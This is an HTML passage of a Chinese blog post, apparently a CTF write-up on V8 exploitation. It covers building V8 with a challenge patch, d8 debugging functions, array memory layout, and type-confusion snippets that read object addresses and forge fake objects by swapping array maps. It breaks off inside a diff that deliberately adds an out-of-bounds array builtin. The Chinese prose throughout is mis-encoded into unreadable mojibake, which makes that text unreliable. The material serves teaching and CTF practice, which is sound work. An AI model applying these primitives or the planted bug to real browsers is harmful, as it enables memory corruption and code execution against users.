          <a href="#2-ä»£ç ä¸‹è½½" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä»£ç ä¸‹è½½" class="headerlink" title="2.ä»£ç ä¸‹è½½"></a>2.ä»£ç ä¸‹è½½</h2>
      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export PATH=/pathto/depot_tools:<span class="variable">$PATH</span>&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="comment">#è·å–v8æºç </span></span><br><span class="line">fetch v8</span><br><span class="line"><span class="comment">#åˆ‡æ¢é¢˜ç›®å¯¹åº”ç‰ˆæœ¬çš„commit</span></span><br><span class="line">git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line"><span class="comment"># å·¥å…·åŒæ­¥</span></span><br><span class="line">gclient sync</span><br><span class="line"><span class="comment">#åº”ç”¨é¢˜ç›®çš„è¡¥ä¸æ–‡ä»¶</span></span><br><span class="line"><span class="comment">#ä¸€èˆ¬è€Œè¨€å‡ºé¢˜éƒ½æ˜¯äººä¸ºç»™æŸä¸ªç‰ˆæœ¬çš„v8åŠ ä¸€ä¸ªæ´ä¸Šå»ï¼Œæ‰€ä»¥ç”¨é¢˜ç›®ç»™çš„diffæ–‡ä»¶ç»™å¼•æ“åŠ æ´</span></span><br><span class="line">git apply ../oob.diff</span><br><span class="line"></span><br><span class="line"><span class="comment">#æœ‰çš„è€ç‰ˆæœ¬æœ€å¥½è¿˜æ˜¯ç”¨python2æ¥ç¼–è¯‘ï¼Œä¸ç„¶è¯­æ³•å¯èƒ½ä¼šå‡ºé”™</span></span><br><span class="line"><span class="comment"># ç¼–è¯‘releaseç‰ˆæœ¬</span></span><br><span class="line"><span class="comment">#æµ‹è¯•expç”¨releaseç‰ˆæœ¬ï¼Œç”¨debugç‰ˆæœ¬æµ‹è¯•é€šå¸¸ä¼šå‡ºé”™</span></span><br><span class="line">./tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C ./out.gn/x64.release</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¼–è¯‘debugç‰ˆæœ¬</span></span><br><span class="line"><span class="comment">#è°ƒè¯•ç”¨debugç‰ˆæœ¬</span></span><br><span class="line">./tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C ./out.gn/x64.debug</span><br></pre></td></tr></table></div></figure>






        <h1 id="äºŒã€å‰ç½®çŸ¥è¯†"   >
          <a href="#äºŒã€å‰ç½®çŸ¥è¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€å‰ç½®çŸ¥è¯†" class="headerlink" title="äºŒã€å‰ç½®çŸ¥è¯†"></a>äºŒã€å‰ç½®çŸ¥è¯†</h1>
      <p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/203721.html" >ä»ä¸€é“CTFé¢˜é›¶åŸºç¡€å­¦V8æ¼æ´åˆ©ç”¨ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-è°ƒè¯•çŸ¥è¯†"   >
          <a href="#1-è°ƒè¯•çŸ¥è¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è°ƒè¯•çŸ¥è¯†" class="headerlink" title="1.è°ƒè¯•çŸ¥è¯†"></a>1.è°ƒè¯•çŸ¥è¯†</h2>
      <p>éœ€è¦æ³¨æ„çš„æ˜¯debugç‰ˆæœ¬çš„ç”¨æ¥è¾…åŠ©æ˜¾ç¤ºï¼Œç›´æ¥æ˜¯æ²¡åŠæ³•è¿è¡Œç›¸å…³ä»£ç çš„ï¼Œrealseç”¨æ¥å®é™…è¿è¡Œã€‚</p>

        <h3 id="1-å·¥å…·"   >
          <a href="#1-å·¥å…·" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å·¥å…·" class="headerlink" title="(1)å·¥å…·"></a>(1)å·¥å…·</h3>
      <p>å¸¸è§çš„pwndbgï¼Œå¯ä»¥æ­é…å¦‚ä¸‹çš„å°å·¥å…·</p>
<p>æºç çš„<code>/pathto/v8/tools</code>ç›®å½•ä¸‹æœ‰ä¸“é—¨ç”¨æ¥è°ƒè¯•v8çš„gdbinitï¼ŒåŠ åœ¨<code>~/.gdbinit</code>ä¸­å³å¯</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /pathto/v8/tools/gdbinit</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å‡½æ•°"   >
          <a href="#2-å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å‡½æ•°" class="headerlink" title="(2)å‡½æ•°"></a>(2)å‡½æ•°</h3>
      <p>åœ¨è¿è¡Œ./d8æ—¶åŠ å…¥<code>--allow-natives-syntax</code>é€‰é¡¹ï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº›è°ƒè¯•å‡½æ•°</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./d8 --allow-natives-syntax</span><br><span class="line"><span class="comment">#æˆ–è€…é…åˆgdb</span></span><br><span class="line">gdb ./d8</span><br><span class="line"><span class="built_in">set</span> args --allow-natives-syntax ./test.js</span><br><span class="line">r</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹å‡½æ•°</p>
<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(obj) <span class="comment">//è¾“å‡ºå¯¹è±¡åœ°å€</span></span><br><span class="line">%SystemBreak() <span class="comment">//è§¦å‘è°ƒè¯•ä¸­æ–­ä¸»è¦ç»“åˆgdbç­‰è°ƒè¯•å™¨ä½¿ç”¨ï¼Œç±»ä¼¼äºpythonä¸­çš„dbg()æ–­ç‚¹</span></span><br></pre></td></tr></table></div></figure>

<p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();  <span class="comment">//è§¦å‘ç¬¬ä¸€æ¬¡è°ƒè¯•</span></span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();  <span class="comment">//è§¦å‘ç¬¬äºŒæ¬¡è°ƒè¯•</span></span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();  <span class="comment">//è§¦å‘ç¬¬ä¸‰æ¬¡è°ƒè¯•</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="2-åŸºç¡€çŸ¥è¯†"   >
          <a href="#2-åŸºç¡€çŸ¥è¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-åŸºç¡€çŸ¥è¯†" class="headerlink" title="2.åŸºç¡€çŸ¥è¯†"></a>2.åŸºç¡€çŸ¥è¯†</h2>
      
        <h3 id="1-å¯¹è±¡å†…å­˜è®²è§£"   >
          <a href="#1-å¯¹è±¡å†…å­˜è®²è§£" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¯¹è±¡å†…å­˜è®²è§£" class="headerlink" title="(1)å¯¹è±¡å†…å­˜è®²è§£"></a>(1)å¯¹è±¡å†…å­˜è®²è§£</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br></pre></td></tr></table></div></figure>

<p>æ¯”å¦‚å¦‚ä¸‹å®šä¹‰æ•°ç»„å¯¹è±¡aï¼Œé‚£ä¹ˆè¿è¡Œ<code>%DebugPrint(a);</code>å¾—åˆ°åœ°å€åï¼Œä½¿ç”¨jobå‘½ä»¤å¯ä»¥çœ‹åˆ°å¦‚ä¸‹çš„å†…å­˜å¸ƒå±€</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012217111.png" alt="image-20220301220834343"></p>
<p>v8åœ¨å†…å­˜ä¸­åªæœ‰æ•°å­—å’Œå¯¹è±¡ä¸¤ç§è¡¨ç¤ºã€‚ä¸ºäº†åŒºåˆ†ä¸¤è€…ï¼Œv8åœ¨æ‰€æœ‰å¯¹è±¡çš„å†…å­˜åœ°å€æœ«å°¾éƒ½åŠ äº†1ï¼Œä»¥ä¾¿è¡¨ç¤ºå®ƒæ˜¯ä¸ªå¯¹è±¡ã€‚å› æ­¤ä¸Šå›¾è¯¥å¯¹è±¡çš„å®é™…å†…å­˜åœ°å€åº”è¯¥ä¸º(0x346b7364dde9-1=<strong>0x346b7364dde8</strong>)</p>
<p>è€Œå¯¹äºæ•°ç»„å¯¹è±¡åˆ™å¤§è‡´å¦‚ä¸‹å¸ƒå±€</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="center">map</th>
<th align="center">è¡¨æ˜äº†ä¸€ä¸ªå¯¹è±¡çš„ç±»å‹å¯¹è±¡ï¼Œä¸Šå›¾å³ä¸ºPACKED_SMI_ELEMENTS</th>
</tr>
</thead>
<tbody><tr>
<td align="center">prototype</td>
<td align="center">prototype</td>
</tr>
<tr>
<td align="center">elements</td>
<td align="center">å¯¹è±¡å…ƒç´ </td>
</tr>
<tr>
<td align="center">length</td>
<td align="center">å…ƒç´ ä¸ªæ•°</td>
</tr>
<tr>
<td align="center">properties</td>
<td align="center">å±æ€§</td>
</tr>
</tbody></table></div>
<p>è€Œå¯¹äºå…¶ä¸­çš„elementså…ƒç´ ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä¸”åœ°å€ä½äºå¯¹è±¡açš„ä¸Šæ–¹ï¼Œèƒ½çœ‹åˆ°é‡Œé¢çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´å…ˆç”³è¯·çš„elementsè¿™ä¸ªå…ƒç´ å†…å­˜ï¼Œç„¶åå†ç”³è¯·çš„æ•°ç»„å¯¹è±¡a</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012221043.png" alt="image-20220301222151967"></p>
<p>é‚£ä¹ˆæ€»çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">elements     ----&gt; +------------------------+</span><br><span class="line">                   |          MAP           +&lt;---------+</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 2         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      .........         |          |</span><br><span class="line"> ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                   |      map               |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      prototype         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      elements          |+--------+|</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      length            |</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      properties        |</span><br><span class="line">                   +------------------------+</span><br></pre></td></tr></table></div></figure>

<p>å…¶ä»–ç±»å‹çš„å¯¹è±¡éƒ½æœ‰äº›ç±»ä¼¼ï¼Œå¯ä»¥è‡ªå·±å»å°è¯•çœ‹çœ‹</p>
<p>å…¶ä¸­ä¹Ÿä¸ä¸€å®šå…ƒç´ åé¢å°±è·Ÿçš„æ˜¯<code>ArrayObject</code>çš„å†…å®¹ï¼Œä¹Ÿå¯èƒ½ä¸­é—´é—´éš”äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ¯”å¦‚å¦‚ä¸‹æƒ…å½¢ï¼Œ<code>elements</code>çš„åœ°å€å’Œ<code>ArrayObject</code>çš„åœ°å€å·®çš„è¿˜æ˜¯æŒºå¤§çš„ï¼Œå¯èƒ½æ˜¯å†…å­˜åˆ†é…ä¸Šçš„ä¸€äº›é—®é¢˜å§?ä¸å¤ªæ‡‚v8çš„å†…å­˜åˆ†é…æ˜¯æ€ä¹ˆå®ç°çš„ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203182051776.png" alt="image-20220318205130634"></p>

        <h3 id="2-ä¸åŒå¯¹è±¡ç±»å‹å†…å­˜åˆ†å¸ƒ"   >
          <a href="#2-ä¸åŒå¯¹è±¡ç±»å‹å†…å­˜åˆ†å¸ƒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä¸åŒå¯¹è±¡ç±»å‹å†…å­˜åˆ†å¸ƒ" class="headerlink" title="(2)ä¸åŒå¯¹è±¡ç±»å‹å†…å­˜åˆ†å¸ƒ"></a>(2)ä¸åŒå¯¹è±¡ç±»å‹å†…å­˜åˆ†å¸ƒ</h3>
      
        <h4 id="â‘ æ•°ç»„å¯¹è±¡"   >
          <a href="#â‘ æ•°ç»„å¯¹è±¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ æ•°ç»„å¯¹è±¡" class="headerlink" title="â‘ æ•°ç»„å¯¹è±¡"></a>â‘ æ•°ç»„å¯¹è±¡</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹å†…å­˜å¸ƒå±€</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">elements     ----&gt; +------------------------+&lt;---------+</span><br><span class="line">                   |          MAP           +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 2         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      .........         |          |</span><br><span class="line"> ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                   |      map               |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      prototype         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      elements          |+--------+|</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      length            |</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      properties        |</span><br><span class="line">                   +------------------------+</span><br></pre></td></tr></table></div></figure>

<p>doubleæˆ–è€…floatçš„æ•°ç»„ä¹Ÿç›¸ä¼¼ï¼Œå°±æ˜¯mapçš„ç±»å‹ä¸º<code>PACKED_DOUBLE_ELEMENTS</code></p>

        <h4 id="â‘¡å¯¹è±¡æ•°ç»„å¯¹è±¡"   >
          <a href="#â‘¡å¯¹è±¡æ•°ç»„å¯¹è±¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡å¯¹è±¡æ•°ç»„å¯¹è±¡" class="headerlink" title="â‘¡å¯¹è±¡æ•°ç»„å¯¹è±¡"></a>â‘¡å¯¹è±¡æ•°ç»„å¯¹è±¡</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> objectArray = [a, b];<span class="comment">//a,bä¸ºå¯¹è±¡</span></span><br></pre></td></tr></table></div></figure>

<p>å³æ•°ç»„é‡Œå­˜æ”¾çš„æ˜¯å¯¹è±¡ï¼Œä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œå°±æ˜¯åœ¨elementsä¸­ä¼šæœ‰ç‚¹ä¸ä¸€æ ·ï¼Œç›¸å½“äºå­˜æ”¾ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘åŒ…å«çš„å¯¹è±¡ï¼ŒåŒ…æ‹¬mapçš„ç±»å‹ä¹Ÿä¸åŒï¼Œä¸º<code>PACKED_ELEMENTS</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012230225.png" alt="image-20220301223028101"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">elementA     ----&gt; +------------------------+&lt;---------+</span><br><span class="line">                   |         MAP            +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |       Length           +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 2         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      .........         |          |</span><br><span class="line">elementB     ----&gt; +------------------------+&lt;---------+</span><br><span class="line">                   |         MAP            +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |       Length           +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 2         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      .........         |          |</span><br><span class="line"> ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                   |      map               |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      prototype         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      elements          |+--------+|</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      length            |</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      properties        |</span><br><span class="line">                   +------------------------+</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-ç±»å‹æ··æ·†"   >
          <a href="#3-ç±»å‹æ··æ·†" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ç±»å‹æ··æ·†" class="headerlink" title="(3)ç±»å‹æ··æ·†"></a>(3)ç±»å‹æ··æ·†</h3>
      <p>å³å½“æˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹<code>ArrayObject</code>çš„mapå±æ€§æ—¶ï¼Œå°±èƒ½å¤Ÿé€ æˆç±»å‹æ··æ·†ã€‚æ¯”å¦‚</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];<span class="comment">//åˆ›å»ºä¸€ä¸ªæµ®ç‚¹æ•°æ•°ç»„</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;<span class="comment">//åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> obj_array = [obj];<span class="comment">//åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ•°ç»„</span></span><br><span class="line"><span class="keyword">let</span> float_array_map = float_array[<span class="number">4</span>];<span class="comment">//å‡è®¾å¯ä»¥è¶Šç•Œå°†float_arrayçš„mapå±æ€§çš„å€¼è¯»å‡ºæ¥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å‡è®¾å¯ä»¥è¶Šç•Œå†™obj_arrayçš„mapå±æ€§ï¼Œä¿®æ”¹ä¸ºæµ®ç‚¹æ•°æ•°ç»„çš„mapå±æ€§çš„å€¼</span></span><br><span class="line">obj_array[<span class="number">1</span>] = float_array_map;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç”±äºobj_arrayçš„mapå±æ€§è¢«ä¿®æ”¹ä¸ºæµ®ç‚¹æ•°æ•°ç»„çš„mapå±æ€§</span></span><br><span class="line"><span class="comment">//é‚£ä¹ˆæ­¤æ—¶å½“jså»è§£æçš„æ—¶å€™ï¼Œå°±ä¼šæŠŠobj_array[0]å½“ä½œä¸€ä¸ªæµ®ç‚¹æ•°</span></span><br><span class="line"><span class="comment">//ä»è€Œèƒ½å¤Ÿè¯»å‡ºobj_array[0]çš„åœ°å€,å³objçš„åœ°å€</span></span><br><span class="line"><span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]);<span class="comment">//f2iä¸ºæµ®ç‚¹è½¬æ— ç¬¦å·æ•´æ•°å‡½æ•°</span></span><br></pre></td></tr></table></div></figure>

<p>åŒæ ·çš„ï¼Œå½“æˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹æŠŠä¸€ä¸ªæµ®ç‚¹æ•°æ•°ç»„çš„mapå±æ€§æ”¹ä¸ºå¯¹è±¡æ•°ç»„çš„mapå±æ€§æ—¶ï¼Œå°±èƒ½å¤Ÿä½¿å¾—v8è®¤ä¸ºè¯¥æµ®ç‚¹æ•°æ•°ç»„ä¸­çš„æµ®ç‚¹æ•°å®é™…æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œæˆ‘ä»¬æ§åˆ¶æ•°ç»„ä¸­çš„å˜é‡çš„å€¼ä¸ºä¸€ä¸ªåœ°å€ï¼Œè¿™æ ·å°±èƒ½å°†ä¸€ä¸ªä»»æ„åœ°å€è½¬åŒ–ä¸ºä¸€ä¸ªobjå¯¹è±¡äº†ã€‚</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];<span class="comment">//åˆ›å»ºä¸€ä¸ªæµ®ç‚¹æ•°æ•°ç»„</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;<span class="comment">//åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> obj_array = [obj];<span class="comment">//åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ•°ç»„</span></span><br><span class="line"><span class="keyword">let</span> obj_array_map = obj_array[<span class="number">1</span>];<span class="comment">//å‡è®¾å¯ä»¥è¶Šç•Œå°†obj_arrayçš„mapå±æ€§çš„å€¼è¯»å‡ºæ¥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å‡è®¾å¯ä»¥è¶Šç•Œå†™float_arrayçš„mapå±æ€§ï¼Œä¿®æ”¹ä¸ºobj_arrayçš„mapå±æ€§çš„å€¼</span></span><br><span class="line">float_array[<span class="number">4</span>] = obj_array_map;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç”±äºfloat_arrayçš„mapå±æ€§è¢«ä¿®æ”¹ä¸ºå¯¹è±¡æ•°ç»„çš„mapå±æ€§</span></span><br><span class="line"><span class="comment">//é‚£ä¹ˆæ­¤æ—¶å½“jså»è§£æçš„æ—¶å€™ï¼Œå°±ä¼šæŠŠfloat_array[0]å½“ä½œä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="comment">//ä»è€Œèƒ½å¤Ÿä¼ªé€ ä»»æ„åœ°å€ä¸ºä¸€ä¸ªè™šå‡çš„å¯¹è±¡</span></span><br><span class="line">fake_obj_addr = i2f(<span class="number">0x111111</span>);<span class="comment">//i2fä¸ºæ•´æ•°è½¬æµ®ç‚¹æ•°</span></span><br><span class="line">float_array[<span class="number">0</span>] = fake_obj_addr;</span><br><span class="line"><span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];<span class="comment">//è·å–è¯¥è™šå‡å¯¹è±¡</span></span><br></pre></td></tr></table></div></figure>




        <h1 id="ä¸‰ã€å®é™…é¢˜ç›®"   >
          <a href="#ä¸‰ã€å®é™…é¢˜ç›®" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€å®é™…é¢˜ç›®" class="headerlink" title="ä¸‰ã€å®é™…é¢˜ç›®"></a>ä¸‰ã€å®é™…é¢˜ç›®</h1>
      <p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://4hou.win/wordpress/?p=32405" >ä»ä¸€é“CTFé¢˜é›¶åŸºç¡€å­¦V8æ¼æ´åˆ©ç”¨ â€“ backup (4hou.win)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-é¢˜ç›®åˆ†æ"   >
          <a href="#1-é¢˜ç›®åˆ†æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-é¢˜ç›®åˆ†æ" class="headerlink" title="1.é¢˜ç›®åˆ†æ"></a>1.é¢˜ç›®åˆ†æ</h2>
      <p>æ·»åŠ çš„diffå¦‚ä¸‹ï¼Œä¸»è¦æ˜¯ä¸€ä¸‹ä¸¤éƒ¨åˆ†ï¼Œå…¶ä»–éƒ¨åˆ†åŠ å…¥çš„å°±åªæ˜¯ä¸ºäº†æ­£å¸¸è¿è¡Œè€Œå·²</p>
<figure class="highlight diff"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = 